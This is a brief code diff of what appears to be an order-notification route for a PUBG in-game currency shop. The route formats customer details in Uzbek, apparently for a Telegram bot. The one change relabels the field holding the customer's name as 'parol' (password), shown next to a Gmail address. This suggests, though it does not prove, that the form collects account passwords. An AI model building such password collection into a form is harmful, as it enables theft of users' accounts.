@@ -27,7 +27,7 @@ export async function POST(req: Request) {
     `🔥 <b>Yangi buyurtma — Oson UC</b>`,
     ``,
     `🆔 <b>Buyurtma:</b> <code>${esc(orderId)}</code>`,
-    `👤 <b>Ism:</b> ${esc(name)}`,
+    `👤 <b>parol:</b> ${esc(name)}`,
     `📧 <b>Gmail:</b> ${esc(email)}`,
     `🎮 <b>PUBG ID:</b> <code>${esc(pubgId || "Kiritilmagan")}</code>`,
     `💎 <b>Paket:</b> ${esc(selectedPackage || "Faqat ro'yxatdan o'tish")}`,
